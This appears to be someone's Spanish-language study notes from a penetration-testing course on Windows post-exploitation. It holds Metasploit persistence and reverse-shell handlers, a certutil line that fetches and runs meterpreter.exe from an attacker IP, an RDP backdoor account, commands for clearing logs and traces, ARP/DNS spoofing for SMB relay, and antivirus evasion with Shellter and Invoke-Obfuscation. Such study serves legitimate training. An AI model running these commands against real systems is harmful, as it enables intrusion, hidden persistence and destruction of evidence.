
----
- Windows
>https://my.ine.com/CyberSecurity/courses/4350487c/host-network-penetration-testing-post-exploitation
>- Buscar por windows postexplotation y explotation
>https://my.ine.com/CyberSecurity/courses/06040120/host-network-penetration-testing-the-metasploit-framework-msf
>- Buscar por Netbios
>https://my.ine.com/CyberSecurity/courses/c9227d5c/host-network-penetration-testing-network-based-attacks

- Evasion de AV buscar por obfuscation
>https://my.ine.com/CyberSecurity/courses/d95a1882/host-network-penetration-testing-exploitation

# Windows Tips

-----

### Post - Explotation

#### Escalada de Privilegios

- Vemos que se cuentan los procesos, el segundo dice que procesos corren debajo de otros

```powershell
C:\windows> wmic service list breif
C:\windows> tasklist /SVC
```

```powershell
C:\windows> schtasks /query /fo LIST
C:\windows> schtasks /query /fo LIST /v
```

- Escalar privilegios con [jaws](https://github.com/411Hall/JAWS)
```bash
meterpreter> upload jaws.ps1
```
- Coger algo del exploit server desde Victima
```bash
certutil -urlcache -f http://192.168.1.135/meterpreter.exe meterpreter.exe
meterpreter.exe
```

- [Privescheck](https://github.com/itm4n/PrivescCheck) enumera configuraciones débiles para la escalada de privs, se puede hacer únicamente con el **.ps1**

>**Winlogon:** propiedad que maneja el login de los users

- Veo que Privs tengo
```bash
C:> whoami /priv
net user
```
#### Persistencia
1. Le especificamos cada cuanto lanza un intento de sesión, con un listener en metasploit escuchando

```bash
msf6> search persistence
use windows/local/persistence_service
```

2. Configuro listener
```bash
msf6> use /multi/handler
set payload windows/meterpreter/reverse_tcp
```

>**Después de utilizarlo, borrar el .exe creado en la víctima** 

- Persistencia con **RDP**
1. Creamos un User
2. Realizamos escritorio remoto fuera de meterpreter
```bash
meterpreter> run getgui -e -u alexis -p hacker123321
	
	# En el output del comando pone lo que tienes que hacer para borrar
[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up __ 20220217.1036.rc

xfreerdp /u: alexis /p:hacker123321 /v:10.2.18.93
```

#### Cracking Hashes

>La **SAM** no se puede copiar cuando el S.O está en ejecución
>En SO modernos la SAM está encriptada con una **Siskey**
>Sacamos las credenciales con técnicas qu eactuán en memoria desde el **lsass process**

>Los hashes NTLM son **md4**

>La palabra p4ssw0rd! se hashea con **md4** y luego se llega a ser un **hash NTLM**
#### Clearing Tracks, Logs & Events

1. We have to work in the temp directory siempre (Si no existe, créalo)
2. metasploit nos chiva la ruta d edonde ha creado los artefactos **(Atentos a esto)**
3. En el output pone la ruta para borrar
```bash
# En el output del comando pone lo que tienes que hacer para borrar
[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up __ 20220217.1036.rc
# si le hacemos un cat a esa ruta
execute -H -f sc.exe -a "stop nlbIMZRc"
execute -H -f sc.exe -a "delete nlbIMZRc"
execute -H -i -f taskkill. exe -a "/f /im MnpUdbMal. exe"
rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\MnpUdbMa.exe"
```
4. Vamos a la máquina víctima
```bash
resource /root/.msf4/logs/scripts/getgui/clean_up __ 20220217.1036.rc
```
5. Por último limpiamos los eventos
```bash
meterpreter> clearev
```

#### NETBios

>se utiliza para compartición de archivos, opera por los puertos , **137 y 138**

- Escanear
```bash
nbtscan 192.168.0.0/24
nmblookup -A IP
smbclient -L dominio/IP

smbclient //10.10.212.81/carpetaCompartida

smbclient //symfonos.local/helios -U helios
# No pedir passwd y mostrar recursos compartidos
smbclient -L //<IP> -N 
smbclient \\\\\\\\$ip\\\\recurso
```

 - Una vez hayamos pivotado a otra máquina podemos ver los recursos con 

```bash
net view IP
net use C: \\IP\C$
dir C:
```

#### SNMP - simple Network Management Protocol

>Protocolo udp de transporte que opera por el puerto **161**

- Como petarlo:
```bash
nmap -sU -p 161 --script snmp* IP
snmpwalk -v 1 -c public/priivate/secret IP
```

- Con eso tenemos info del sistema como process, muchas cosas más y users del S.O

#### SMB Relay

> Tipo de ataque en el que interceptamos, manipulamos el tráfico SMB y se lo transmitimos al legit server

1. Interceptamos: Cascamos un **MITM**, esto lo conseguimos envenenando las tablas **ARP**, con **DNS poisoning**  o con ataque de **ROGUE SMB**
```bash
echo "IP *.dominio.com" > dns
dnspoof -i eth0 -f dns
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t IPaSpoofear Gateway
```
1. Ahí  es cuando el cliente realiza una acción contra el server legítimo y utiliza su hash para autenticarse, ahí lo pillamos nosotros

#### AV Obfuscation

- **Sistema de detección basado en firmas**
>Estos sistemas tienen grandes BD donde almacenan hashes, si estos hasesh coinciden con el de nuestro malware, se cargará nuestro bicho


- **Sistema de detección basado en Heurística**
>Puede ser descubierto por propiedades dentro del code

- **Sistema de detección basado en comportamiento**
>Puede ser descubierto por comportamiento del malware, cuando se ejecuta


##### Evasiones en disco
1. **Obfusación:** reorganiza el código para que sea más difícil analizarlo
2. **Encoding**
3. **PAcking:** convertimos el mismo binario con un tamaño más pequeño
4. **Crypters:** encriptamos el código y lo desencriptamos en memoria, la función de desencriptación se almacena en stub

##### Evasiones en Memoria
1. Se centra en la manipulación de la memoria y no escribe archivos en el disco.
2. Inyecta el payload en un proceso aprovechando varias API de Windows.
3. El payload se ejecuta en memoria en un subproceso independiente.
##### Shelter

>**Shelter:** Inyecta tremendo shellcode en los ejecutables legítimos y no tan legits (PE), tratando de que pasen desapercibidos para los AV

- Instalaremos wine para poder utilizar ejecutables de iwndow sen sistema unix

```bash
# Habilitamos los paquetes x32
sudo dpkg --add-architecture i386
sudo apt-get install wine32
```
- Ejecutamos
```bash
cd /usr/share/windows-resources/shellter
wine shelter.exe
```

##### Obfuscating PowerShell code

>Github de la [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) 

- Utilizaremos **PS**  en linux
```bash
sudo apt intsall powershell -y
pwsh
Import-Moudle invoke-obfuscation.ps1
Invoke-Obfuscation
SET SCRIPTPATH ruta.ps1
```

- El .ps1 va  a llevar una reverse shell 